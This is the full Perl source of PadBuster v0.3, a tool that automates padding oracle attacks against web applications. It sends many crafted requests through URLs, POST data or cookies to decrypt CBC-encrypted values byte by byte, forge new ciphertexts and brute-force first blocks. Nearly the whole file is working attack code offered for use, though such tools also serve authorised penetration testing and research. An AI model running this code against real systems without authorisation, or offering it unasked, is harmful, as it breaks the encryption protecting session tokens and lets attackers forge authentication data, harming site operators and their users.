#!/usr/bin/perl
#
# PadBuster v0.3 - Automated script for performing Padding Oracle attacks
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
#
# Credits to J.Rizzo and T.Duong for providing proof of concept web exploit
# techniques and S.Vaudenay for initial discovery of the attack. Credits also
# to James M. Martin (research@esptl.com) for sharing proof of concept exploit
# code for performing various brute force attack techniques.
# 

use LWP::UserAgent;
use strict;
use Getopt::Std;
use MIME::Base64;
use URI::Escape;
use Getopt::Long;
use Time::HiRes qw( gettimeofday );
use Compress::Zlib;

GetOptions( "log" => \my $logFiles,
            "post=s" => \my $post,
            "encoding=s" => \my $encoding,
            "headers=s" => \my $headers,
            "cookies=s" => \my $cookie,
            "error=s" => \my $error,
            "prefix=s" => \my $prefix,
            "intermediate=s" => \my $intermediaryInput,
            "ciphertext=s" => \my $cipherInput,
            "plaintext=s" => \my $plainTextInput,
	    "encodedtext=s" => \my $encodedPlainTextInput,
            "noencode" => \my $noEncodeOption,
            "veryverbose" => \my $superVerbose,
            "proxy" => \my $proxy,
            "proxyauth" => \my $proxyAuth,
            "noiv" => \my $noIv,
            "auth=s" => \my $auth,
            "resume=s" => \my $resumeBlock,
            "interactive" => \my $interactive,
            "bruteforce" => \my $bruteForce,
            "ignorecontent" => \my $ignoreContent,
            "usebody" => \my $useBody,
            "verbose" => \my $verbose);
  
print "\n+-------------------------------------------+\n";
print "| PadBuster - v0.3                          |\n";
print "| Brian Holyfield - Gotham Digital Science  |\n";
print "| labs\@gdssecurity.com                      |\n";
print "+-------------------------------------------+\n";

if ($#ARGV < 2) { 
 die "    
    Use: padBuster.pl URL EncryptedSample BlockSize [options]

  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to test. Must
                           also be present in the URL, PostData or a Cookie
         BlockSize = The block size being used by the algorithm

Options:
	 -auth [username:password]: HTTP Basic Authentication 
	 -bruteforce: Perform brute force against the first block 
	 -ciphertext [Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)
         -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
         -encoding [0-4]: Encoding Format of Sample (Default 0)
                          0=Base64, 1=Lower HEX, 2=Upper HEX
                          3=.NET UrlToken, 4=WebSafe Base64
         -encodedtext [Encoded String]: Data to Encrypt (Encoded)
         -error [Error String]: Padding Error Message
         -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
	 -interactive: Prompt for confirmation on decrypted bytes
	 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
	 -log: Generate log files (creates folder PadBuster.DDMMYY)
	 -noencode: Do not URL-encode the payload (encoded by default)
	 -noiv: Sample does not include IV (decrypt first block) 
         -plaintext [String]: Plain-Text to Encrypt
         -post [Post Data]: HTTP Post Data String
	 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
	 -proxy [address:port]: Use HTTP/S Proxy
	 -proxyauth [username:password]: Proxy Authentication
	 -resume [Block Number]: Resume at this block number
	 -usebody: Use response body content for response analysis phase
         -verbose: Be Verbose
         -veryverbose: Be Very Verbose (Debug Only)
         
";}

# Ok, if we've made it this far we are ready to begin..
my $url = @ARGV[0];
my $sample = @ARGV[1];
my $blockSize = @ARGV[2];

if ($url eq "" || $sample eq "" || $blockSize eq "")
{
	print "\nERROR: The URL, EncryptedSample and BlockSize cannot be null.\n";
	exit();
}

# Hard Coded Inputs
#$post = "";
#$sample = "";

my $method = $post ? "POST" : "GET";

# These are file related variables
my $dirName = "PadBuster." . getTime("F");
my $dirSlash = "/";
my $dirCmd = "mkdir ";
if ($ENV{'OS'} =~ /Windows/) {
 $dirSlash = "\\";
 $dirCmd = "md ";
}
my $dirExists = 0;
my $printStats = 0;
my $requestTracker = 0;
my $timeTracker = 0;
 
if ($encoding < 0 || $encoding > 4)
{
	print "\nERROR: Encoding must be a value between 0 and 4\n";
	exit();
} 
my $encodingFormat = $encoding ? $encoding : 0;

my $encryptedBytes = $sample;
my $totalRequests = 0;

# See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)
if ($sample =~ /\%/)
{
	$encryptedBytes = uri_unescape($encryptedBytes)
}

# Prep the sample for regex use
$sample = quotemeta $sample;

# Now decode
$encryptedBytes = myDecode($encryptedBytes, $encodingFormat);
if ( (length($encryptedBytes) % $blockSize) > 0)
{
	print "\nERROR: Encrypted Bytes must be evenly divisible by Block Size ($blockSize)\n";
	print "       Encrypted sample length is ".int(length($encryptedBytes)).". Double check the Encoding and Block Size.\n";
	exit();
}

# If no IV, then append nulls as the IV (only if decrypting)
if ($noIv && !$bruteForce && !$plainTextInput)
{
	$encryptedBytes = "\x00" x $blockSize . $encryptedBytes;
}

# PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)
my $plainTextBytes;

# This is a bool to make sure we know where to replace the sample string
my $wasSampleFound = 0;

# ForgedBytes is where the complete forged sample will be stored (encrypt only)
my $forgedBytes;

# Isolate the IV into a separate byte array
my $ivBytes = substr($encryptedBytes, 0, $blockSize);

# Declare some optional elements for storing the results of the first test iteration
# to help the user if they don't know what the padding error looks like
my @oracleCantidates;
my $oracleSignature = "";
my %oracleGuesses;
my %responseFileBuffer;

# The block count should be the sample divided by the blocksize
my $blockCount = int(length($encryptedBytes)) / int($blockSize);

if (!$bruteForce && !$plainTextInput && $blockCount < 2)
{
	print "\nERROR: There is only one block. Try again using the -noiv option.\n";
	exit();
}

# The attack works by sending in a real cipher text block along with a fake block in front of it
# You only ever need to send two blocks at a time (one real one fake) and just work through
# the sample one block at a time


# First, re-issue the original request to let the user know if something is potentially broken
my ($status, $content, $location, $contentLength) = makeRequest($method, $url, $post, $cookie);

myPrint("\nINFO: The original request returned the following",0);
myPrint("[+] Status: $status",0);	
myPrint("[+] Location: $location",0);
myPrint("[+] Content Length: $contentLength\n",0);
myPrint("[+] Response: $content\n",1);

$encodedPlainTextInput ? $plainTextInput = myDecode($encodedPlainTextInput,$encodingFormat) : ""; 

if ($bruteForce)
{
	myPrint("INFO: Starting PadBuster Brute Force Mode",0);
	my $bfAttempts = 0;
	
	$resumeBlock ? print "INFO: Resuming previous brute force at attempt $resumeBlock\n" : "";
	
	# Only loop through the first 3 bytes...this should be enough as it 
	# requires 16.5M+ requests
	
	my @bfSamples;
	my $sampleString = "\x00" x 2;
	for my $c (0 ... 255)
	{
	 substr($sampleString, 0, 1, chr($c));
	 for my $d (0 ... 255)
	 {
	  substr($sampleString, 1, 1, chr($d));
	  push (@bfSamples, $sampleString);
	 }
	}

	foreach my $testVal (@bfSamples)
	{
	 my $complete = 0;
	 while ($complete == 0)
	 {
	  my $repeat = 0;
	  for my $b (0 ... 255)
	  {
  	   $bfAttempts++;  	   
  	   if ($resumeBlock && ( $bfAttempts < ($resumeBlock - ($resumeBlock % 256)+1) ) )
	   {
		   #SKIP
	   } 
	   else 
	   {
		   my $testBytes = chr($b).$testVal;
		   $testBytes .= "\x00" x ($blockSize-3);

		   my $combinedBf = $testBytes;  
		   $combinedBf .= $encryptedBytes;
		   $combinedBf = myEncode($combinedBf, $encoding);

		   # Add the Query String to the URL
		   my ($testUrl, $testPost, $testCookies) = prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  

		   # Issue the request
		   my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl, $testPost, $testCookies);

		   my $signatureData = "$status\t$contentLength\t$location";
		   $useBody ? ($signatureData = "$status\t$contentLength\t$location\t$content") : "" ;

		   if ($oracleSignature eq "")
		   {
			$b == 0 ? myPrint("[+] Starting response analysis...\n",0) : "";
			$oracleGuesses{$signatureData}++;
			$responseFileBuffer{$signatureData} = "Status: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
			if ($b == 255)
			{
				myPrint("*** Response Analysis Complete ***\n",0);
				determineSignature();
				$printStats = 1;
				$timeTracker = 0;
				$requestTracker = 0;
				$repeat = 1;
				$bfAttempts = 0;
			}
		   }
		   if ($oracleSignature ne "" && $oracleSignature ne $signatureData)
		   {
			myPrint("\nAttempt $bfAttempts - Status: $status - Content Length: $contentLength\n$testUrl\n",0);
			writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content");
		   }
	   }
	  }
	  ($repeat == 1) ? ($complete = 0) : ($complete = 1);
	 } 
	}  
}
elsif ($plainTextInput)
{
	# ENCRYPT MODE
	myPrint("INFO: Starting PadBuster Encrypt Mode",0);
	
	# The block count will be the plaintext divided by blocksize (rounded up)	
	my $blockCount = int(((length($plainTextInput)+1)/$blockSize)+0.99);
	myPrint("[+] Number of Blocks: ".$blockCount."\n",0);
	
	my $padCount = ($blockSize * $blockCount) - length($plainTextInput);	
	$plainTextInput.= chr($padCount) x $padCount;
	
	# SampleBytes is the encrypted text you want to derive intermediate values for, so 
	# copy the current ciphertext block into sampleBytes
	# Note, nulls are used if not provided and the intermediate values are brute forced
	
	$forgedBytes = $cipherInput ? myDecode($cipherInput,1) : "\x00" x $blockSize;
	my $sampleBytes = $forgedBytes;
	
	for (my $blockNum = $blockCount; $blockNum > 0; $blockNum--)
	{ 	
		# IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored
		my $intermediaryBytes;
		
		if ($intermediaryInput && $blockNum == $blockCount)
		{
			$intermediaryBytes = myDecode($intermediaryInput,2);
		} 
		else 
		{
			$intermediaryBytes = processBlock($sampleBytes);
		}
				
	        # Now XOR the intermediate bytes with the corresponding bytes from the plain-text block
	        # This will become the next ciphertext block (or IV if the last one)
	        $sampleBytes = $intermediaryBytes ^ substr($plainTextInput, (($blockNum-1) * $blockSize), $blockSize);
		$forgedBytes = $sampleBytes.$forgedBytes;
		
		myPrint("\nBlock ".($blockNum)." Results:",0);
		myPrint("[+] New Cipher Text (HEX): ".myEncode($sampleBytes,1),0);
		myPrint("[+] Intermediate Bytes (HEX): ".myEncode($intermediaryBytes,1)."\n",0);
		
	}
	$forgedBytes = myEncode($forgedBytes, $encoding);
	chomp($forgedBytes);
} 
else
{
	# DECRYPT MODE
	myPrint("INFO: Starting PadBuster Decrypt Mode",0);
	
	if ($resumeBlock)
	{
		myPrint("INFO: Resuming previous exploit at Block $resumeBlock\n",0);
	} 
	else 
	{
		$resumeBlock = 1
	}
	
	# Assume that the IV is included in our sample and that the first block is the IV	
	for (my $blockNum = ($resumeBlock+1); $blockNum <= $blockCount; $blockNum++) 
	{ 
		# Since the IV is the first block, our block count is artificially inflated by one
		myPrint("*** Starting Block ".($blockNum-1)." of ".($blockCount-1)." ***\n",0);
		
		# SampleBytes is the encrypted text you want to break, so 
		# lets copy the current ciphertext block into sampleBytes
		my $sampleBytes = substr($encryptedBytes, ($blockNum * $blockSize - $blockSize), $blockSize);

		# IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored
		my $intermediaryBytes = processBlock($sampleBytes);

		# DecryptedBytes is where the decrypted block is stored
		my $decryptedBytes;			        	

		# Now we XOR the decrypted byte with the corresponding byte from the previous block
		# (or IV if we are in the first block) to get the actual plain-text
		$blockNum == 2 ? $decryptedBytes = $intermediaryBytes ^ $ivBytes : $decryptedBytes = $intermediaryBytes ^ substr($encryptedBytes, (($blockNum - 2) * $blockSize), $blockSize);

		myPrint("\nBlock ".($blockNum-1)." Results:",0);
		myPrint("[+] Cipher Text (HEX): ".myEncode($sampleBytes,1),0);
		myPrint("[+] Intermediate Bytes (HEX): ".myEncode($intermediaryBytes,1),0);
		myPrint("[+] Plain Text: $decryptedBytes\n",0);
		$plainTextBytes = $plainTextBytes.$decryptedBytes;
	}
}

myPrint("-------------------------------------------------------",0);	
myPrint("** Finished ***\n", 0);
if ($plainTextInput)
{
	myPrint("[+] Encrypted value is: ".uri_escape($forgedBytes),0);
} 
else
{	
	myPrint("[+] Decrypted value (ASCII): $plainTextBytes\n",0);
	myPrint("[+] Decrypted value (HEX): ".myEncode($plainTextBytes,2)."\n", 0);
	myPrint("[+] Decrypted value (Base64): ".myEncode($plainTextBytes,0)."\n", 0);
}
myPrint("-------------------------------------------------------\n",0);	

sub determineSignature()
{ 
	# Help the user detect the oracle response if an error string was not provided
	# This logic will automatically suggest the response pattern that occured most often 
	# during the test as this is the most likeley one

	my @sortedGuesses = sort {$oracleGuesses{$a} <=> $oracleGuesses{$b}} keys %oracleGuesses; 

	myPrint("The following response signatures were returned:\n",0);
	myPrint("-------------------------------------------------------",0);
	if ($useBody)
	{
		myPrint("ID#\tFreq\tStatus\tLength\tChksum\tLocation",0);
	} 
	else 
	{
		myPrint("ID#\tFreq\tStatus\tLength\tLocation",0);
	}
	myPrint("-------------------------------------------------------",0);

	my $id = 1;

	foreach (@sortedGuesses) 
	{
		my $line = $id;
		($id == $#sortedGuesses+1 && $#sortedGuesses != 0) ? $line.= " **" : "";
		my @sigFields = split("\t", $_);
		$line .= "\t$oracleGuesses{$_}\t@sigFields[0]\t@sigFields[1]";
		$useBody ? ( $line .= "\t".unpack( '%32A*', @sigFields[3] ) ) : "";
		$line .= "\t@sigFields[2]";
		myPrint($line,0);
		writeFile("Response_Analysis_Signature_".$id.".txt", $responseFileBuffer{$_});
		$id++;
	}
	myPrint("-------------------------------------------------------",0);	

	if ($#sortedGuesses == 0 && !$bruteForce)
	{
		myPrint("\nERROR: All of the responses were identical.\n",0);
		myPrint("Double check the Block Size and try again.",0);
		exit();
	} 
	else 
	{
		my $responseNum = &promptUser("\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended");
		myPrint("\nContinuing test with selection $responseNum\n",0);
		$oracleSignature = @sortedGuesses[$responseNum-1];
	}
}

sub prepRequest
{
	my ($pUrl, $pPost, $pCookie, $pSample, $pTestBytes) = @_;

	# Prepare the request			
	my $testUrl = $pUrl;
	my $wasSampleFound = 0;
	
	if ($pUrl =~ /$pSample/)
	{
		$testUrl =~ s/$pSample/$pTestBytes/;
		$wasSampleFound = 1;
	} 

	my $testPost = "";						
	if ($pPost)
	{
		$testPost = $pPost;
		if ($pPost =~ /$pSample/)
		{
			$testPost =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	my $testCookies = "";
	if ($pCookie)
	{
		$testCookies = $pCookie;
		if ($pCookie =~ /$pSample/)
		{
			$testCookies =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	if ($wasSampleFound == 0)
	{
		myPrint("ERROR: Encrypted sample was not found in the test request",0);
		exit();
	}
	return ($testUrl, $testPost, $testCookies);
}

sub processBlock
{
  	my ($sampleBytes) = @_; 
  	
  	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
  	(!$error && $oracleSignature eq "") ? my $analysisMode = 0 : my $analysisMode = 1;
  	
  	# The return value of this subroutine is the intermediate text for the block
	my $returnValue;
  	
  	my $complete = 0;
  	my $autoRetry = 0;
  	my $hasHit = 0;
  	
  	while ($complete == 0)
  	{
  		# Reset the return value
  		$returnValue = "";
  		
  		my $repeat = 0;
	
		# TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack
		my $testBytes = "\x00" x $blockSize;
	
		my $falsePositiveDetector = 0;

		# Work on one byte at a time, starting with the last byte and moving backwards
		OUTERLOOP:
		for (my $byteNum = $blockSize - 1; $byteNum >= 0; $byteNum--)
		{
			INNERLOOP:
			for (my $i = 255; $i >= 0; $i--)
			{			
				# Fuzz the test byte
				substr($testBytes, $byteNum, 1, chr($i));

				# Combine the test bytes and the sample
				my $combinedTestBytes = $testBytes.$sampleBytes;

				if ($prefix)
				{
					$combinedTestBytes = myDecode($prefix,$encodingFormat).$combinedTestBytes 
				}

				$combinedTestBytes = myEncode($combinedTestBytes, $encodingFormat);				
				chomp($combinedTestBytes);

				if (! $noEncodeOption) 
				{
					$combinedTestBytes = uri_escape($combinedTestBytes); 
				}

				my ($testUrl, $testPost, $testCookies) = prepRequest($url, $post, $cookie, $sample, $combinedTestBytes);

				# Ok, now make the request

				my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl, $testPost, $testCookies);

				
				my $signatureData = "$status\t$contentLength\t$location";
				$useBody ? ($signatureData = "$status\t$contentLength\t$location\t$content") : "";
				
				# If this is the first block and there is no padding error message defined, then cycle through 
				# all possible requests and let the user decide what the padding error behavior is.
				if ($analysisMode == 0)
				{
					$i == 255 ? myPrint("INFO: No error string was provided...starting response analysis\n",0) : "";
					$oracleGuesses{$signatureData}++;
					
					$responseFileBuffer{$signatureData} = "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
					
					if ($byteNum == $blockSize - 1 && $i == 0)
					{
						myPrint("*** Response Analysis Complete ***\n",0);
						determineSignature();
						$analysisMode = 1;
						$repeat = 1;
						last OUTERLOOP;
					}
				}

				my $continue = "y";

				if (($error && $content !~ /$error/) || ($oracleSignature ne "" && $oracleSignature ne $signatureData))
				{
					# This is for autoretry logic (only works on the first byte)
					if ($autoRetry == 1 &&  ($byteNum == ($blockSize - 1) ) && $hasHit == 0 )
					{
						$hasHit++;
					} 
					else
					{
						# If there was no padding error, then it worked
						myPrint("[+] Success: ($i) [Byte ".($byteNum+1)."]",0);
						myPrint("[+] Test Byte:".uri_escape(substr($testBytes, $byteNum, 1)),1);
						
						# If continually getting a hit on attempt zero, then something is probably wrong
						$i == 255 ? $falsePositiveDetector++ : "";

						if ($interactive == 1)
						{
							$continue = &promptUser("Do you want to use this value (Yes/No/All)? [y/n/a]","",1);
						}

						if ($continue eq "y" | $continue eq "a")
						{
							$continue eq "a" ? $interactive = 0 : "";

							# Next, calculate the decrypted byte by XORing it with the padding value
							my ($currentPaddingByte, $nextPaddingByte);

							# These variables could allow for flexible padding schemes (for now PCKS)
							# For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)
							$currentPaddingByte = chr($blockSize - $byteNum);
							$nextPaddingByte = chr($blockSize - $byteNum + 1);

							my $decryptedByte = substr($testBytes, $byteNum, 1) ^ $currentPaddingByte;
							myPrint("[+] XORing with Padding Char, which is ".uri_escape($currentPaddingByte),1);

							$returnValue = $decryptedByte.$returnValue;
							myPrint("[+] Decrypted Byte is: ".uri_escape($decryptedByte),1);

							# Finally, update the test bytes in preparation for the next round, based on the padding used 
							for (my $k = $byteNum; $k < $blockSize; $k++)
							{
								# First, XOR the current test byte with the padding value for this round to recover the decrypted byte
								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $currentPaddingByte));				

								# Then, XOR it again with the padding byte for the next round
								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $nextPaddingByte));
							}
							last INNERLOOP;                        
						}

					}
				}
				
				## TODO: Combine these two blocks?
				if ($i == 0 && $analysisMode == 1)
				{
					# End of the road with no success.  We should probably try again.
					myPrint("ERROR: No matching response on [Byte ".($byteNum+1)."]",0);

					if ($autoRetry == 0 && ($byteNum == ($blockSize - 2) ) )
					{
						$autoRetry = 1;
						myPrint("       Automatically trying one more time...",0);
						$repeat = 1;
						last OUTERLOOP;
						
					}
					else 
					{
						if (($byteNum == $blockSize - 1) && ($error))
						{
							myPrint("\nAre you sure you specified the correct error string?",0);
							myPrint("Try re-running without the -e option to perform a response analysis.\n",0);
						} 

						$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
						if ($continue ne "n")
						{
							myPrint("INFO: Switching to interactive mode",0);
							$interactive = 1;
							$repeat = 1;
							last OUTERLOOP;
						}					
					}
				}   
				if ($falsePositiveDetector == $blockSize)
				{
					myPrint("\n*** ERROR: It appears there are false positive results. ***\n",0);
					myPrint("HINT: The most likely cause for this is an incorrect error string.\n",0);
					if ($error)
					{
						myPrint("[+] Check the error string you provided and try again, or consider running",0);
						myPrint("[+] without an error string to perform an automated response analysis.\n",0);
					} 
					else 
					{
						myPrint("[+] You may want to consider defining a custom padding error string",0);
						myPrint("[+] instead of the automated response analysis.\n",0);
					}
					$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
					if ($continue eq "y")
					{
						myPrint("INFO: Switching to interactive mode",0);
						$interactive = 1;
						$repeat = 1;
						last OUTERLOOP;
					}
				}
			} 
		}
		($repeat == 1) ? ($complete = 0) : ($complete = 1);
	}
	return $returnValue;
}

sub makeRequest {
 my ($method, $url, $data, $cookie) = @_; 
 my ($noConnect, $numRetries, $lwp, $status, $content, $req, $location, $contentLength);   

 $requestTracker++;
 #print "$url\n\n";
 do 
 {
  $lwp = LWP::UserAgent->new(env_proxy => 1,
                            keep_alive => 1,
                            timeout => 30,
			    requests_redirectable => [],
                            );
 
  $req = new HTTP::Request $method => $url;

  # Add request content for POST and PUTS 
  if ($data ne "") {
   $req->content_type('application/x-www-form-urlencoded');
   $req->content($data);
  }
 
  if ($proxy)
  {
  	my $proxyUrl = "http://";
  	if ($proxyAuth)
 	{
 		my ($proxyUser, $proxyPass) = split(":",$proxyAuth);
 		$ENV{HTTPS_PROXY_USERNAME}	= $proxyUser;
		$ENV{HTTPS_PROXY_PASSWORD}	= $proxyPass;
		$proxyUrl .= $proxyAuth."@";
 	}
 	$proxyUrl .= $proxy;
 	$lwp->proxy(['http'], $proxyUrl);
	$ENV{HTTPS_PROXY}		= "http://".$proxy;
  } 	


  if ($auth) {
   my ($httpuser, $httppass) = split(/:/,$auth);
   $req->authorization_basic($httpuser, $httppass);
  }

  # If cookies are defined, add a COOKIE header
  if (! $cookie eq "") {
   $req->header(Cookie => $cookie);
  }
 
  if ($headers) {
   my @customHeaders = split(/;/i,$headers);
   for (my $i = 0; $i <= $#customHeaders; $i++) {
    my ($headerName, $headerVal) = split(/\::/i,$customHeaders[$i]);
    $req->header($headerName, $headerVal);
   }
  }
 
  my $startTime = gettimeofday();
  my $response = $lwp->request($req);
  my $endTime = gettimeofday();  
  $timeTracker = $timeTracker + ($endTime - $startTime);
  
  if ($printStats == 1 && $requestTracker % 250 == 0)
  {
  	print "[+] $requestTracker Requests Issued (Avg Request Time: ".(sprintf "%.3f", $timeTracker/100).")\n";
  	$timeTracker = 0;
  }
  
  # Extract the required attributes from the response
  $status = substr($response->status_line, 0, 3);
  $content = $response->content;
 
  $superVerbose ? myPrint("Response Content:\n$content",0) : "";
  $location = $response->header("Location");
  if ($location eq "")
  {
   $location = "N/A";
  }
  $contentLength = $response->header("Content-Length");
  
  my $contentEncoding = $response->header("Content-Encoding");
  if ($contentEncoding =~ /GZIP/i )
  {
    	$content = Compress::Zlib::memGunzip($content);
  	$contentLength = length($content);
  }
  
  my $statusMsg = $response->status_line;
  #myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); 
 
  if ($statusMsg =~ /Can't connect/) {
   print "ERROR: $statusMsg\n   Retrying in 10 seconds...\n\n";
   $noConnect = 1;
   $numRetries++;
   sleep 10;
  } else {
   $noConnect = 0;
   $totalRequests++;
  }  
 } until (($noConnect == 0) || ($numRetries >= 15));
 if ($numRetries >= 15) {
  myPrint("ERROR: Number of retries has exceeded 15 attempts...quitting.\n",0);
  exit;
 }
 return ($status, $content, $location, $contentLength);
}
 
sub myPrint {
 my ($printData, $printLevel) = @_;
 $printData = $printData."\n";
 if (($verbose && $printLevel > 0) || $printLevel < 1 || $superVerbose)
 {
  print $printData;
  writeFile("ActivityLog.txt",$printData);
 }
}

sub myEncode {
 my ($toEncode, $format) = @_;
 return encodeDecode($toEncode, 0, $format);
}

sub myDecode {
 my ($toDecode, $format) = @_;
 return encodeDecode($toDecode, 1, $format);
}

sub encodeDecode {
 my ($toEncodeDecode, $oper, $format) = @_;
 # Oper: 0=Encode, 1=Decode
 # Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken
 my $returnVal = "";
 if ($format == 1 || $format == 2)
 {
   # HEX
   if ($oper == 1)
   {
   	#Decode
   	#Always convert to lower when decoding)
   	$toEncodeDecode = lc($toEncodeDecode);
	$returnVal = pack("H*",$toEncodeDecode);
   } 
   else 
   {
   	#Encode
	$returnVal = unpack("H*",$toEncodeDecode);
	if ($format == 2)
	{
	   	#Uppercase
		$returnVal = uc($returnVal)
   	}
   }
 } 
 elsif ($format == 3)
 {
   # NetUrlToken
   if ($oper == 1)
   {
	$returnVal = web64Decode($toEncodeDecode,1);
   }
   else
   {
	$returnVal = web64Encode($toEncodeDecode,1);
   } 
 }
 elsif ($format == 4)
  {
    # Web64
    if ($oper == 1)
    {
 	$returnVal = web64Decode($toEncodeDecode,0);
    }
    else
    {
 	$returnVal = web64Encode($toEncodeDecode,0);
    } 
 }
 else
  {
    # B64
    if ($oper == 1)
    {
 	$returnVal = decode_base64($toEncodeDecode);
    }
    else
    {
 	$returnVal = encode_base64($toEncodeDecode);
 	$returnVal =~ s/(\r|\n)//g;	
    }
 }
 
 return $returnVal;
}


sub web64Encode {
 my ($input, $net) = @_;
 # net: 0=No Padding Number, 1=Padding (NetUrlToken)
 $input = encode_base64($input);
 $input =~ s/(\r|\n)//g;
 $input =~ s/\+/\-/g;
 $input =~ s/\//\_/g;
 my $count = $input =~ s/\=//g;
 ($count eq "") ? ($count = 0) : "";
 ($net == 1) ? $input.= $count : "";
 return $input;
}

sub web64Decode {
 my ($input, $net) = @_;
 # net: 0=No Padding Number, 1=Padding (NetUrlToken)
 $input =~ s/\-/\+/g;
 $input =~ s/\_/\//g;
 if ($net == 1)
 {
  my $count = chop($input);
  $input = $input.("=" x int($count));
 }
 return decode_base64($input);
}


sub promptUser {
 my($prompt, $default, $yn) = @_;
 my $defaultValue = $default ? "[$default]" : "";
 print "$prompt $defaultValue: ";
 chomp(my $input = <STDIN>);
 
 $input = $input ? $input : $default;
 if ($yn)
 {
  if ($input =~ /^y|n|a$/)
  {
   return $input;
  }
  else
  {
   promptUser($prompt, $default, $yn);
  }
 } 
 else 
 {
  if ($input =~ /^-?\d/ && $input > 0 && $input < 256)
  {
   return $input;
  } else {
   promptUser($prompt, $default);
  }
 }
}

sub writeFile
{
 my ($fileName, $fileContent) = @_;
 if ($logFiles)
 {
  if ($dirExists != 1)
  {
   system($dirCmd." ".$dirName);
   $dirExists = 1;
  }
  $fileName = $dirName.$dirSlash.$fileName;
  open(OUTFILE, ">>$fileName") or die "ERROR: Can't write to file $fileName\n";
  print OUTFILE $fileContent;
  close(OUTFILE);
 }
}

sub getTime { 
 my ($format) = @_;
 my ($second, $minute, $hour, $day, $month, $year, $weekday, $dayofyear, $isDST) = localtime(time);
 my @months = ("JAN","FEB","MAR","APR","MAY","JUN","JUL","AUG","SEP","OCT","NOV","DEC");
 my @days = ("SUN","MON","TUE","WED","THU","FRI","SAT");
 ($minute < 10) ? ($minute = "0".$minute) : "";
 ($second < 10) ? ($second = "0".$second) : "";
 ($day < 10)  ? ($day = "0".$day) : ""; 
 ($month < 10) ? ($month = "0".$month) : "";
 ($hour < 10) ? ($hour = "0".$hour) : "";
 $year =~ s/^.//;
 if ($format eq "F") {
  return $day.$months[$month].$year."-".( ($hour * 3600) + ($minute * 60) + ($second) );
 } elsif ($format eq "S") {
  return $months[$month]." ".$day.", 20".$year." at ".$hour.":".$minute.":".$second;
 } else {
  return $hour.":".$minute.":".$second;
 }
}


